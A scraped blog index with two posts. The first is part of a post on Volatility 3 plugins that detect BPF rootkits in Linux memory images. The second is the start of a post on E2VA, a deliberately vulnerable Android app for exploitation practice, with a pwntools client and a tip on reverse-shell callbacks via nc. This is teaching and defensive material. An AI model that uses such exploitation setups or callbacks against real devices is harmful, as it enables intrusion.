details that lead up to the execution of BPF LSM programs in great detail. Based on this knowledge, we developed the bpf_lsm plugin that can discover hidden BPF programs attached to security hooks. In short, the plugin checks the places where the kernel control flow may be diverted into the BPF VM for the presence of inline hooks. If they are found, it cross checks with the links IDR to see if there is a corresponding link, the absence of which is a strong indication of tampering. Additionally, the plugin is also valuable in the absence of tampering, as it shows you the exact program attachment point without the need to manually resolve BTF IDs. In particular, the plugin displays the number of attached programs and their IDs along with the name of the LSM hook where they are attached.\ncolumns: list[tuple[str, type]] = [ (\u0026#34;LSM HOOK\u0026#34;, str), (\u0026#34;Nr. PROGS\u0026#34;, int), (\u0026#34;IDs\u0026#34;, str), ] Networking Hooks As we described above, traffic control (tc) programs are especially useful for exfiltrating information from infected machines, e.g., by hijacking existing TCP connections. Thus, the second plugin that obtains its information from more tamper resistant sources targets tc BPF programs. It only relies on the mini_Qdisc structure that is used on the transmission and receive fast paths to look up queuing disciplines (qdisc) attached to a network device.\nWe use the ifconfig plugin by Ofek Shaked and Amir Sheffer to obtain a list of all network devices. Then, we find the above-mentioned structure and use it to collect all BPF programs that are involved into qdiscs on this device. With kernel 6.3 the process of locating the mini_Qdisc from the network interface changed slightly due to the introduction of link-based attachment of tc programs, however, the plugin recognizes and handles both cases. Finally, the bpf_netdev plugin displays the following information about each interface where at least one BPF program was found,\ncolumns: list[tuple[str, type]] = [ (\u0026#34;NAME\u0026#34;, str), (\u0026#34;MAC ADDR\u0026#34;, str), (\u0026#34;EGRESS\u0026#34;, str), (\u0026#34;INGRESS\u0026#34;, str), ] where the EGRESS and INGRESS hold the IDs of the programs that process packets flowing into the respective direction.\nFinding Processes Yet another way to discover BPF objects is through the processes that hold on to them. As with many other resources, programs, links, maps, and btf are represented to processes as file descriptors. They can be used to act on the object, retrieve information about it, and serve as a mechanism to clean up after processes that did not exit gracefully. Furthermore, an investigator might want to find out which process holds on to a specific BPF object in order to investigate this process further.\nThus, the bpf_listprocs plugin displays the following pieces of information for every process that holds on to at least one BPF object via a file descriptor.\ncolumns: list[tuple[str, type]] = [ (\u0026#34;PID\u0026#34;, int), (\u0026#34;COMM\u0026#34;, str), (\u0026#34;PROGS\u0026#34;, str), (\u0026#34;MAPS\u0026#34;, str), (\u0026#34;LINKS\u0026#34;, str), ] Here, the PROGS. MAPS, and LINKS columns display the IDs of the respective objects. This list is generated by iterating over all file descriptors and the associated file structures. BPF objects are identified by checking the file operations f_op pointer, and the corresponding bpf_(prog|map|link) structures are found by following the pointer stored in the private member.\nNot every BPF object must be reachable from the process list, however. They can, for example, also be represented as files under the special bpf filesystem, which is usually mounted at /sys/fs/bpf, or processes can close file descriptors and the object will remain alive as long as there are other references to it.\nConnecting the Dots Finally, we would like to present the bpf_graph plugin, a meta analysis that we have build on top of the four listing plugins. As its name suggest, its goal is to visualize the state of the BPF subsystem as a graph.\nThere are four types of nodes in this graph: programs, maps, links and processes. Different node types are distinguished by shape. Within a node type, the different program/map/link types are distinguished by color and process nodes are colored based on their process ID (PID). Furthermore, map and program nodes are labeled with the ID and name of the object, link nodes are labeled with the ID and attachment information of the link, and process nodes receive the PID and comm (name of the user-space program binary) of their process as labels.\nThere are three types of edges to establish relationships between nodes: file descriptor, link, and map. File descriptor edges are dotted and connect processes to BPF objects that they have an open fd for. Link edges are dashed and connect BPF links to the program they reference. Finally, map edges are drawn solid and connect maps to all of the programs that use them.\nEspecially for large applications with hundreds or even thousands of objects, it is essential to be able to filter the graph to make it useful. We have therefore implemented two additional options that can be passed to the plugin. First, you can pass a list of node types to include in the output. Second, you can pass a list of nodes, and only the connected components that contain at least one of those nodes will be drawn.\nThe idea of this plugin is to make the information of the four listing plugins more accessible to investigators by combining it into a single picture. This is especially useful for complex applications with possibly hundreds of programs and maps, or on busy systems where many different processes have loaded BPF programs.\nPlugin output comes in two forms, a dot-format encoding of the graph, where each BPF object node has metadata containing all of the plugin columns, and as a picture of the graph, drawn with a default layout algorithm. The latter should suffice for most users, but the former allows advanced use-cases to do further processing.\nNote: We provide standalone documentation for all plugins in our project on GitHub.\nCase Study In this section we will use the plugins to examine the memory image of a system with a high level of BPF activity. To get a diverse set of small BPF applications we launched the example programs that come with libbpf-bootstrap and some of the kernel self-tests. You can download the memory image and symbols to follow along. If you prefer to analyze a single, large application have a look at the krie example in our plugin documentation .\nA good first step is to use the graph plugin to get an overview of the subsystem (# vol -f /io/dumps/debian-bookworm-6.1.0-13-amd64_all.raw linux.bpf_graph).\nAs we can see, there are several components corresponding to different processes, each of which holds a number of BPF resources. Let us begin by examining the \u0026ldquo;Hello, World\u0026rdquo; example of BPF, the minimal program:\n// SPDX-License-Identifier: GPL-2.0 OR BSD-3-Clause /* Copyright (c) 2020 Facebook */ #include \u0026lt;linux/bpf.h\u0026gt; #include \u0026lt;bpf/bpf_helpers.h\u0026gt; char LICENSE[] SEC(\u0026#34;license\u0026#34;) = \u0026#34;Dual BSD/GPL\u0026#34;; int my_pid = 0; SEC(\u0026#34;tp/syscalls/sys_enter_write\u0026#34;) int handle_tp(void *ctx) { int pid = bpf_get_current_pid_tgid() \u0026gt;\u0026gt; 32; if (pid != my_pid) return 0; bpf_printk(\u0026#34;BPF triggered from PID %d.\\n\u0026#34;, pid); return 0; } The above source code is compiled with clang to produce an ELF relocatable object file. It contains the BPF bytecode along with additional information, like BTF sections, CORE relocations, programs as well as their attachment mechanisms and points, maps that are used and so on. This ELF is then embedded into a user space program that statically links against libbpf. At runtime, it passed the ELF to libbpf, which takes care of all the relocations and kernel interactions required to wire up the program to the BPF VM.\nWith the above C code in the back of our heads, we can now have a look at the relevant component of live system’s BPF object graph. To limit the output of the plugin to the connected components that contain certain nodes, we can add the --components flag to the invocation and give it a list of nodes (the format is \u0026lt;node_type\u0026gt;-\u0026lt;id\u0026gt; where node_type is in {map,link,prog,proc} and id is the BPF object ID or PID).\nAs we can see, the ELF has caused libbpf to create a program, two maps and a link while loading. We can now use our plugins to gather more information about each object. Let\u0026rsquo;s start with the program itself.\n# vol -f /io/dumps/debian-bookworm-6.1.0-13-amd64_all.raw linux.bpf_listprogs --id 98 --dump-jited --dump-xlated Volatility 3 Framework 2.5.0 Progress: 100.00 Stacking attempts finished OFFSET (V) ID TYPE NAME TAG LOADED AT MAP IDs BTF ID HELPERS 0xbce500673000 98 TRACEPOINT handle_tp 6a5dcef153b1001e 1417821088492 40,45 196 bpf_get_current_pid_tgid,bpf_trace_printk By looking at the last column we can see that it is indeed using two kernel helper functions, where the apparent call to bpf_printk turns out to be a macro that expands to bpf_trace_printk. If we look at the program byte and the machine code side by side, we can discover a few things.\n# cat .prog_0xbce500673000_98_bdisasm 0x0: 85 00 00 00 10 b2 02 00 call 0x2b210 0x8: 77 00 00 00 20 00 00 00 rsh64 r0, 0x20 0x10: 18 01 00 00 00 a0 49 00 00 00 00 00 e5 bc ff ff lddw r1, 0xffffbce50049a000 0x20: 61 11 00 00 00 00 00 00 ldxw r1, [r1] 0x28: 5d 01 05 00 00 00 00 00 jne r1, r0, +0x5 0x30: 18 01 00 00 10 83 83 f5 00 00 00 00 7b 9b ff ff lddw r1, 0xffff9b7bf5838310 0x40: b7 02 00 00 1c 00 00 00 mov64 r2, 0x1c 0x48: bf 03 00 00 00 00 00 00 mov64 r3, r0 0x50: 85 00 00 00 80 0c ff ff call 0xffff0c80 0x58: b7 00 00 00 00 00 00 00 mov64 r0, 0x0 0x60: 95 00 00 00 00 00 00 00 exit # cat .prog_0xbce500673000_98_mdisasm handle_tp: 0xffffc03772a0: 0f 1f 44 00 00 nop dword ptr [rax + rax] 0xffffc03772a5: 66 90 nop 0xffffc03772a7: 55 push rbp 0xffffc03772a8: 48 89 e5 mov rbp, rsp 0xffffc03772ab: e8 d0 fc aa f1 call 0xffffb1e26f80 # bpf_get_current_pid_tgid 0xffffc03772b0: 48 c1 e8 20 shr rax, 0x20 0xffffc03772b4: 48 bf 00 a0 49 00 e5 bc ff ff movabs rdi, 0xffffbce50049a000 # minimal_.bss + 0x110 0xffffc03772be: 8b 7f 00 mov edi, dword ptr [rdi] 0xffffc03772c1: 48 39 c7 cmp rdi, rax 0xffffc03772c4: 75 17 jne 0xffffc03772dd # handle_tp + 0x3d 0xffffc03772c6: 48 bf 10 83 83 f5 7b 9b ff ff movabs rdi, 0xffff9b7bf5838310 # minimal_.rodata + 0x110 0xffffc03772d0: be 1c 00 00 00 mov esi, 0x1c 0xffffc03772d5: 48 89 c2 mov rdx, rax 0xffffc03772d8: e8 13 57 a7 f1 call 0xffffb1dec9f0 # bpf_trace_printk 0xffffc03772dd: 31 c0 xor eax, eax 0xffffc03772df: c9 leave 0xffffc03772e0: c3 ret 0xffffc03772e1: cc int3 The first lesson here is probably that symbol annotations are useful :). As expected, when ignoring the prologue and epilogue inserted by the JIT-compiler, the translation between BPF and x86_64 is essentially one-to-one. Furthermore, uses of global C variables like my_pid or the format string result in direct references to kernel memory, where the closest preceding symbols are the minimal_.bss\u0026rsquo;s and minimal_.rodata\u0026rsquo;s bpf_map structures, respectively. For simple array maps, the bpf_map structure resides at the beginning of a buffer that also holds the array data, 0x110 is simply the offset at which the map\u0026rsquo;s payload data starts. More generally, libbpf will automatically create maps to hold the variables living in the .data, .rodata, and .bss sections.\nDumping the map contents confirms that the .bss map holds the minimal process\u0026rsquo;s PID while the .rodata map contains the format string.\n# vol -f /io/dumps/debian-bookworm-6.1.0-13-amd64_all.raw linux.bpf_listmaps --id 45 40 --dump Volatility 3 Framework 2.5.0 Progress: 100.00 Stacking attempts finished OFFSET (V) ID TYPE NAME KEY SIZE VALUE SIZE MAX ENTRIES 0xbce500499ef0 40 ARRAY minimal_.bss 4 4 1 0x9b7bf5838200 45 ARRAY minimal_.rodata 4 28 1 # cat .map_0xbce500499ef0_40 {\u0026#34;0\u0026#34;: \u0026#34;section (.bss) = {\\n (my_pid) (int) b\u0026#39;\\\\xb7\\\\x02\\\\x00\\\\x00\u0026#39;\\n\u0026#34;} # cat .map_0x9b7bf5838200_45 {\u0026#34;0\u0026#34;: \u0026#34;section (.rodata) = {\\n (handle_tp.____fmt) b\u0026#39;BPF triggered from PID %d.\\\\n\\\\x00\u0026#39;\\n\u0026#34;} In the source code we saw the directive SEC(\u0026quot;tp/syscalls/sys_enter_write\u0026quot;), which instructs the compiler to place the handle_tp function\u0026rsquo;s BPF bytecode in an ELF section called \u0026quot;tp/syscalls/sys_enter_write\u0026quot;. While loading, libbpf picks this up and creates a link that attaches the program to a perf event that is activated by the sys_enter_write tracepoint. We can inspect the link, but getting more information about the corresponding trace point is not yet implemented. Contributions are always highly welcome :)\n# vol -f /io/dumps/debian-bookworm-6.1.0-13-amd64_all.raw linux.bpf_listlinks --id 11 Volatility 3 Framework 2.5.0 Progress: 100.00 Stacking attempts finished OFFSET (V) ID TYPE PROG ATTACH 0x9b7bc2c09ae0 11 PERF_EVENT 98 Dissecting the \u0026ldquo;Hello, World\u0026rdquo; programm was useful to get an impression of what a BPF application looks like at runtime. Before concluding this section, we will have a look at a less minimalist example, the process with PID 687.\nThis process is one of the kernel self-tests. It tests a BPF feature that allows to load new function pointer tables used for dynamic dispatch (so called structure operations), where the individual operations are implemented as BPF programs, at runtime. The programs that implement the new operations can be recognized by their type STRUCT_OPS.\n# vol -f /io/dumps/debian-bookworm-6.1.0-13-amd64_all.raw linux.bpf_listprogs --id 37 39 40 42 43 44 45 Volatility 3 Framework 2.5.0 Progress: 100.00 Stacking attempts finished OFFSET (V) ID TYPE NAME TAG LOADED AT MAP IDs BTF ID HELPERS 0xbce5003b7000 37 STRUCT_OPS dctcp_init 562160e42a59841c 1417427431243 9,10,7 124 bpf_sk_storage_get,bpf_sk_storage_delete 0xbce50046b000 39 STRUCT_OPS dctcp_ssthresh cddbf7f9cf9b52d7 1417427590219 9 124 0xbce500473000 40 STRUCT_OPS dctcp_update_alpha 6e84698df8007e42 1417427647277 9 124 0xbce500487000 42 STRUCT_OPS dctcp_state dc878de7981c438b 1417427777414 9 124 0xbce500493000 43 STRUCT_OPS dctcp_cwnd_event 70cbe888b7ece66f 1417427888091 9 124 bpf_tcp_send_ack 0xbce5004e5000 44 STRUCT_OPS dctcp_cwnd_undo 78b977678332d89f 1417428066805 9 124 0xbce5004eb000 45 STRUCT_OPS dctcp_cong_avoid 20ff0d9ab24c8843 1417428109672 9 124 tcp_reno_cong_avoid The mapping between the programs and the function pointer table they implement is realized through a special map of type STRUCT_OPS created by the process.\n# vol -f /io/dumps/debian-bookworm-6.1.0-13-amd64_all.raw linux.bpf_listmaps --id 11 12 Volatility 3 Framework 2.5.0 Progress: 100.00 Stacking attempts finished OFFSET (V) ID TYPE NAME KEY SIZE VALUE SIZE MAX ENTRIES 0x9b7bc3c41000 11 STRUCT_OPS dctcp_nouse 4 256 1 0x9b7bc3c43400 12 STRUCT_OPS dctcp 4 256 1 Unfortunately, the current implementation does not parse the contents of the map, so it cannot determine the name of the kernel structure being implemented and the mapping between its member functions and the BPF programs. As always, contributions are highly welcome :). In this case, we would find out that it implements tcp_congestion_ops to load a new TCP congestion control algorithm on the fly.\nThere is a lot more to explore in this memory image, so feel free to have a closer look at the other processes. You might also want to check out the krie example in our documentation to get an impression of a larger BPF application.\nTesting We tested the plugins on memory images acquired from virtual machines running on QEMU/KVM that were suspended for the duration of the acquisition process. To ensure the correctness of all plugin results, we have cross-checked them by debugging the guest kernel as well as comparing them with bpftool running on the guest.\nBelow is a list of the distributions and releases that we used for manual testing\nDebian\n12.2.0-14, Linux 6.1.0-13 Ubuntu\n22.04.2, Linux 5.15.0-89-generic 20.04, Linux 5.4.0-26-generic Custom\nLinux 6.0.12, various configurations Linux 6.2.12, various configurations For each of these kernels, we tested at least all the plugins on an image taken during the execution of the libbpf-bootstrap example programs.\nAdditionally, to the above mentioned kernels we also developed an evaluation framework (the code is not public). The framework is based on Vagrant and libvirt /KVM . First we create and update all VMs. After that we run programs from libbpf-bootstrap with nohup so that we can leave the VM and dump the memory from outside. To dump the memory we use virsh with virsh dump \u0026lt;name of VM\u0026gt; --memory-only. virsh dump pauses the VM for a clean acquisition of the main memory. We also install debug symbols for all the Linux distributions under investigation so that we can gather the debug kernels (vmlinux with DWARF debugging information) and the System.map file. We then use both files with dwarf2json to generate the ISF information that Volatility 3 needs. Currently, we tested the following Linux distributions with their respective kernels:\nAlma Linux 9 - Linux kernel 5.14.0-362.8.1.el9_3.x86_64 ✅ Fedora 38 - Linux kernel 6.6.6-100.fc38.x86_64 ✅ Fedora 39 - Linux kernel 6.6.6-200.fc39.x86_64 ✅ CentOS Stream 9 - Linux kernel 5.14.0-391.el9.x86_64 ✅ Rocky Linux 8 - Linux kernel 4.18.0-513.9.1.el8_9.x86_64 ✅ Rocky Linux 9 - 🪲 kernel-debuginfo-common package is missing so the kernel debugging symbols cannot be installed (list of packages ) Debian 11 - Linux kernel 5.10.0-26-amd64 ✅ Debian 12 - Linux kernel 6.1.0-13-amd64 ✅ Ubuntu 22.04 - Linux kernel 5.15.0-88-generic ✅ Ubuntu 23.10 - Linux kernel 6.5.0-10-generic ✅ (works partially, but process listing is broken due to this dwarf2json GitHub Issue ) ArchLinux - Linux kernel 6.6.7-arch1-1 ✅ (works partially, but breaks probably due to the same issue as volatility3/dwarf2json GitHub Issue ) openSUSE Tumbleweed - ❓ it seems that the debug kernel that is provided by OpenSUSE does contain debugging symbols but other sections such as .rodata are removed (zeroed out) so that dwarf2json is not able to find the banner (further analyses cannot be carried out without this information) - we will further investigate this issue We will check if the problems get resolved and re-evaluate our plugin. Generally, our framework is designed to support more distributions as well and we will try to evaluate the plugin on a wider variety of them.\nDuring our automated analysis we encountered an interesting problem. To collect the kernels with debugging symbols from the VMs we need to copy them to the host. When copying the kernel executable file it will be read into main memory by the kernel\u0026rsquo;s page-cache mechanism. This implies that parts of the kernel file (vmlinux) and the kernel itself (the running kernel not the file) may be present in the dump. This can lead to the problem of the Volatility 3 function find_aslr (source code ) first finding matches in the page-cached kernel file (vmlinux) and not in the running kernel. An issue has been opened here .\nRelated Work There are several articles on BPF that cover different security-related aspects of the subsystem. In this section, we will briefly discuss the ones that are most relevant to the presented work.\nMemory Forensics: The crash utility, which is used to analyze live systems or kernel core dumps, has a bpf subcommand that can be used to display information about BPF maps and programs. However, as it is not a forensics tool it relies solely on the information obtained via the prog_idr and map_ird. Similarly, the drgn programmable debugger comes with a script to list BPF programs and maps but suffers from the same problems when it comes to anti-forensic techniques. Furthermore, drgn and crash are primarily known as debugging tools for systems developers and as such not necessarily well-established in the digital forensics and incidence response (DFIR) community. In contrast, we implemented our analyses as plugins for the popular Volatility framework well-known in the DFIR community. Finally, A. Case and G. Richard presented Volatility plugins for investigating the Linux tracing infrastructure in their BlackHat US 2021 paper . Apart from a plugin that lists programs by parsing the prog_idr, they have also implemented several plugins that can find BPF programs by analyzing the data structures of the attachment mechanisms they use, such as kprobes, tracepoints or perf events. Thus, their plugins are also able to discover inconsistencies that could reveal anti-forensic tampering. However, they have never publicly released their plugins and despite several attempts we have been unable to contact the authors to obtain a copy of the source code. Volatility already supports detecting BPF programs attached to sockets in its sockstat plugin. The displayed information is limited to names and IDs.\nReverse Engineering: Reverse engineering BPF programs is a key step while triaging the findings of our plugins. Recently, the Ghidra software reverse engineering (SRE) suite gained support for the BPF architecture , which means that its powerful decompiler can be used to analyze BPF bytecode extracted from kernel memory or user-space programs. Furthermore, BPF bytecode is oftentimes embedded into user-space programs that use framework libraries to load it into the kernel at runtime. For programs written in the Go programming language, ebpfkit-monitor can parse the binary format of these embedded files to list the defined programs and maps as well as their interactions. It uses this information to generate graphs that are similar to those of our bpf_graph plugin. Although the utility of these graphs has inspired our plugin, it is fundamentally different in that it displays information about the state of the kernel\u0026rsquo;s BPF subsystem extracted from a memory image. Consequently, it is inherently agnostic to the user-space framework that was used for compiling and loading the programs. Additionally, it displays the actual state of the BPF subsystem instead of the BPF objects that might be created by an executable at runtime.\nRuntime Protection and Monitoring: Important aspects of countering BPF malware are preventing attackers from loading malicious BPF programs and logging suspicious events for later review. krie and ebpfkit-monitor are tools that can be used to log BPF-related events as well as to deny processes access to the BPF system call.\nSimply blocking access on a per-process basis is too course-grained for many applications and thus multiple approaches were proposed to implement a more fine-grained access control model for the BPF subsystem to facilitate the realization of least privilege policies. Among those, one can further distinguish between proposals that implement access control in user space, kernel space, or a hypervisor.\nbpfman (formerly known as bpfd) is a privileged user space daemon that acts as proxy for loading BPF programs and can be used to implement different access control policies. A combination of a privileged user-space daemon and kernel changes is used in the proposed BPF token approach that allows delegation of access to specific parts of the BPF subsystem to container processes by a privileged daemon.\nA fine-grained in-kernel access control is offered by the CapBits proposed by Yi He et al. Here, two bitfields are added to the task_struct, where one defines the access that a process has to the BPF subsystem, e.g., allowed program types and helpers, and the other restricts the access that BPF programs can have on the process, e.g., to prevent it from being traced by kprobe programs. Namespaces are already used in many areas of the Linux kernel to virtualize global resources like PIDs or network devices. Thus, Y. Shao proposed introducing BPF namespaces to limit the scope of loaded programs to processes inside of the namespace. Finally, signatures over programs are a mechanism that allows the kernel to verify their provenance, which can be used analogous to module signatures that prevent attackers from loading malicious kernel modules.\nLastly, Y. Wang et al. proposed moving large parts of the BPF VM from the kernel into a hypervisor, where they implement a multi-step verification process that includes enforcing a security policy, checking signatures, and scanning for known malicious programs. In the security policy, allowed programs can be specified as a set of deterministic finite automata, which allows for accepting dynamically generated programs without allowing for arbitrary code to be loaded.\nAll these approaches are complementary to our plugins as they focus on reducing the chance that an attacker can successfully load a malicious program, while we assume that this step has already happened and aim to detect their presence.\nConclusion In this post, we gave an introduction to the Linux BPF subsystem and discussed its potential for abuse. We then presented seven Volatility plugins that allow investigators to detect BPF malware in memory images and evaluated them on multiple versions of popular Linux distributions. To conclude the post, we will briefly discuss related projects we are working on and plans for future work.\nThis project grew out of the preparation of a workshop on BPF rootkits at the DFRWS EU 2023 annual conference (materials ). We began working on this topic because we believe that the forensic community needs to expand its toolbox in response to the rise of BPF in the Linux world to fill blind spots in existing analysis methods. Additionally, investigators who may encounter BPF in their work should be made aware of the potential relevance of the subsystem to their investigation.\nWhile the workshop, our plugins, and this post are an important step towards this goal, much work remains to be done. First, in order for the present work to be useful in the real world our next goal must be to upstream most of it into the Volatility 3 project. Only this will ensure that investigators all around the world will be able to easily find and use it. This will require:\nRefactoring of our utility code to use Volatility 3\u0026rsquo;s extension class mechanism The bpf_graph plugin relies on networkx , which is not yet a dependency of Volatility 3. If the introduction of a new dependency into the upstream project is not feasible, one could make it optional by checking for the presence of the package within the plugin. Additional testing on older kernel versions and kernels with diverse configurations to meet Volatility\u0026rsquo;s high standards regarding compatibility We will be happy to work with upstream developers to make the integration happen.\nFurthermore, there remains the problem of dealing with the wide variety of map types when extracting their contents, as well as the related problem of pretty-printing them using BTF information. Here, we consider a manual implementation approach to be impractical and would explore the possibility of using emulation of the relevant functions.\nRegarding the advanced analysis aimed at countering anti-forensics, we have also implemented consistency checks against the lists of kprobes and tracepoints, but these require further work to be ready for publication. We also described additional analyses in our workshop that still need to be implemented.\nFinally, an interesting side effect of the introduction of BPF into the Linux kernel is that most of the functionality requires BTF information for the kernel and modules to be available. This provides an easy solution to the problem of obtaining type information from a raw memory image, a step that is central to automatic profile generation. We have already shown that it is possible to reliably extract BTF sections from memory images by implementing a plugin for that. We have also explored the possibility of combining this with existing approaches for extracting symbol information in order to obtain working profiles from a dump. While the results are promising, further work is needed to have a usable solution.\nAppendix A: Kernel Configuration This section provides a list of compile-time kernel configuration options that can be adjusted to restrict the capabilities of BPF programs. In general, it is recommended to disable unused features in order to reduce the attack surface of a system.\nBPF_SYSCALL=n : Disables the BPF system call. Probably breaks most systemd-based systems. DEBUG_INFO_BTF=n : Disables generation of BTF debug information, i.e., CORE no longer works on this system. Forces attackers to compile on/for the system they want to compromise. BPF_LSM=n : BPF programs cannot be attached to LSM hooks. LOCK_DOWN_KERNEL_FORCE_INTEGRITY=y : Prohibits the use of bpf_probe_write_user. NET_CLS_BPF=n and NET_ACT_BPF=n : BPF programs cannot be used in TC classifier actions. Stops some data exfiltration techniques. FUNCTION_ERROR_INJECTION=n : Disables the function error injection framework, i.e., BPF programs can no longer use bpf_override_return. NETFILTER_XT_MATCH_BPF=n : Disables option to use BPF programs in nftables rules . Could be used to implement malicious firewall rules. BPF_EVENTS=n : Removes the option to attach BPF programs to kprobes, uprobes, and tracepoints. Below are options that limit features that we consider less likely to be used by malware.\nBPFILTER=n : This is an unfinished BPF-based replacement of iptables/nftables (currently not functional). LWTUNNEL_BPF=n : Disables the use of BPF programs for routing decisions in light weight tunnels. CGROUP_BPF=n : Disables the option to attach BPF programs to cgoups. Cgroup programs can monitor various networking-related events of processes in the group. Probably breaks most systemd-based systems. ","permalink":"https://lolcads.github.io/posts/2023/12/bpf_memory_forensics_with_volatility3/","tags":["Linux","kernel","eBPF","BPF","forensics","rootkit","malware"],"title":"BPF Memory Forensics with Volatility 3"},{"categories":null,"content":"Investigating Binary Exploitation for JNI on Android This post aims to be an introduction into a blog series about binary exploitation on Android. It tries to describe how the environment that runs vulnerable modules is set up and how the damnvulnerableapp supports the process of binary exploitation on Android.\nWarning The following app is intended to be vulnerable to specific attacks and can result in arbitrary code execution in the context of the app. Therefore, beware of this and do not use this app on a device/emulator that contains personal information whatsoever. Always launch the app in a controlled environment. No authentication is necessary to connect to the app and talk to vulnerable modules. Assuming the app is free of bugs, there is a guarantee that only one client can connect at a time.\nE2VA, the damnvulnerableapp In order to properly investigate binary exploitation on Android, an app has been written that allows for running custom vulnerable modules, i.e. Java classes with one entry point, in a separate process. It is remotely controllable and constructed in a way that allows to (re-)run a module multiple times even when it crashed.\nThe app is named E2VA, i.e. Exploitation Experience (with) Vulnerable App. Within this blog series, E2VA and damnvulnerableapp will be used interchangably, so do not get confused!\nThe core of the damnvulnerableapp is a background service, called manager, that handles communication with external users (only one at a time) and translates the messages received into actions to perform. Among other things, the most important actions are:\nSelecting a vulnerable module to be run in a separate process. This has to be done, because it is very likely that the vulnerable module will crash in case we mess up with an exploit. Exiting a vulnerable module. This will shutdown the process that hosts the vulnerable module and revert back to a selection state. Forwarding messages to the vulnerable module. It is possible to forward arbitrary binary data. Of course it is up to the module to accept this or not. E.g. if a vulnerable module internally calls strcpy, sending arbitrary binary data will probably not do the trick. Fetching messages from the vulnerable module. When sending a fetch request, the manager will try to read data from the vulnerable module. Depending on the configurations, this can time out or block forever. Therefore, the usual steps are:\nSelect a module Forward and fetch data until done, i.e. either until the process crashes or exits by itself or is instructed by an external user to terminate. Optionally, when trying to terminate the hosting process, manager can be instructed to do so. As regards selecting a module, the following diagram tries to illustrate this process: Notice that the Zygote process is responsible for creating a new activity by forking. Therefore, the vulnerable process will contain e.g. the same canary as the manager app, which was also forked from Zygote.\nIn addition to selecting a module, the next diagram describes how data is fetched from a module and sent to an external user: If a vulnerable module crashes, e.g. due to a failed exploitation attempt, then the manager will detect this and revert back to the selection state. Therefore, one may select a new module immediately after the old module crashed. It is advised to not flood manager with commands as it takes time to spawn a process or detect that a process died. The latter heavily depends on the configurations and the module\u0026rsquo;s content.\nAlso, the app requires specific privileges in order to avoid being rendered irresponsive after some time (often after 10s). To that end the app requests ACTION_MANAGE_OVERLAY_PERMISSION (which is a runtime permission that can be dangerous, so please run the app on a device/emulator that does not contain personal information whatsoever, just in case damnvulnerableapp gets hijacked by someone other than you). This permission seems to keep the manager alive.\nArchitecture damnvulnerableapp is tested on an x86_64 Pixel 3 emulator that runs Android 12.0.0. The build number is SE1A.220203.002.A1 . Therefore, all exploits that involve shellcode will contain x86_64 assembly.\nRunning Vulnerable Modules Assuming there is a vulnerable module to be run, the manager can be started from Android Studio or via adb . Also damnvulnerableapp should be launched in debug mode. Technically speaking, there is no need to start the app from Android Studio other than being able to attach lldb to the vulnerable module, as well as to adjust configurations to avoid timeouts etc. In order to get to more realistic binary exploitation, one should start with the .apk file, start the app from console and go from there.\nAnother thing to consider is that one should not try to call e.g. execve in the vulnerable process. This comes from the fact that e.g. execve will \u0026ldquo;destroy\u0026rdquo; the actual vulnerable process, thus shutting down the connection to manager. As manager will assume the process to be dead, because the connection broke, it will attempt to fully kill remnants of the vulnerable process and then revert back to a select state. Thus, calling e.g. execve dooms the vulnerabe process to be destroyed by manager. One may think of this as an additional security mechanism, or just a reminder that stealthy exploits are cooler than loud one - shot exploits.\nTypes of vulnerable modules In order to allow for as many perspectives as possible for binary exploitation on Android, each vulnerable module encapsulates one of the following:\na completely different vulnerability class than all the other modules. E.g. buffer - overflow vs. use - after - free. a slightly modified version of a fixed vulnerability class. E.g. a use - after - free vulnerability can result in a Write - What - Where condition or in an attacker being able to execute a chosen function, depending on the implementation. Consider the composition of a vulnerable module: As can be seen in the above diagram, every (currently) module uses JNI functions to introduce vulnerabilities to be exploited. This is where binary exploitation becomes applicable to Java, namely due to native function calls.\nCommunication with vulnerable modules damnvulnerableapp will listen for incoming connections on port 8080. If it is run on an emulator, an external user may connect through nc 127.0.0.1 8080. Before this is possible, one needs to run\n$ adb forward tcp:8080 tcp:8080 Otherwise, establishing a connection is refused. When trying to create a callback (or reverse shell etc.) in an emulator, i.e. establishing a connection from the emulator to the host, use nc 10.0.2.2 \u0026lt;port\u0026gt;. According to docs , 10.0.2.2 is a \u0026ldquo;special alias to your host loopback interface\u0026rdquo;.\nThe manager will only react to messages from an external user, i.e. it uses a request - response model to handle communication. Therefore, an external agent must not assume that it will be informed if the vulnerable module has a non - empty output queue. An external user always has to explicitly ask the manager to fetch available output data.\nIn order to ease communication with the damnvulnerableapp and therefore the vulnerable modules, a client emerged that wraps the most important functionalities required to interact with the modules. The client is based on pwntools , but can easily be translated to work with plain sockets aswell.\nThe following is the implementation of the pwntools - based client (no guarantees for correctness and completeness):\n#!/usr/bin/env python3 from pwn import * from typing import Tuple TIMEOUT = 5 class PwnClient: def __init__(self, host : str, port : int): self.io = remote(host, port) self.handshake() def handshake(self) -\u0026gt; None: self.send(b\u0026#39;USER\u0026#39;, b\u0026#39;INIT\u0026#39;, capsule_type=b\u0026#39;INIT\u0026#39;) self.receive() def close(self) -\u0026gt; None: self.send(b\u0026#39;\u0026#39;, b\u0026#39;SHUTDOWN\u0026#39;) self.receive() self.send(b\u0026#39;\u0026#39;, b\u0026#39;\u0026#39;, capsule_type=b\u0026#39;ACK\u0026#39;) self.io.close() def send(self, message : bytes, operation, capsule_type=b\u0026#39;CONTENT\u0026#39;) -\u0026gt; None: capsule = capsule_type + b\u0026#39; \u0026#39; + operation + b\u0026#39; CONTENT \u0026#39; + message length = len(capsule) self.io.send(p32(length, endian=\u0026#39;big\u0026#39;)) self.io.send(capsule) def block_receive(self, num_bytes : int) -\u0026gt; bytes: message = b\u0026#39;\u0026#39; while (len(message) \u0026lt; num_bytes): received = self.io.recv(1, timeout=TIMEOUT) if (received and len(received) \u0026gt; 0): message += received return message \u0026#34;\u0026#34;\u0026#34; Returns: (length, capsule_type, operation, content) \u0026#34;\u0026#34;\u0026#34; def receive(self) -\u0026gt; Tuple[int, bytes, bytes, bytes]: length = u32(self.block_receive(4), endian=\u0026#39;big\u0026#39;) message = self.block_receive(length) split_message = message.split(b\u0026#39; \u0026#39;) operation = None if (len(split_message) \u0026gt;= 2): operation = split_message[1] content = None if (len(split_message) \u0026gt;= 4): content = b\u0026#39; \u0026#39;.join(split_message[3:]) return (length, split_message[0], operation, content) def select(self, module_name : str) -\u0026gt; str: self.send(module_name.encode(\u0026#39;utf-8\u0026#39;), b\u0026#39;SELECT\u0026#39;) return self.receive()[3].decode() def forward(self, message : bytes) -\u0026gt; str: self.send(message, b\u0026#39;FORWARD\u0026#39;) return self.receive()[3].decode() def fetch(self) -\u0026gt; bytes: self.send(b\u0026#39;\u0026#39;, 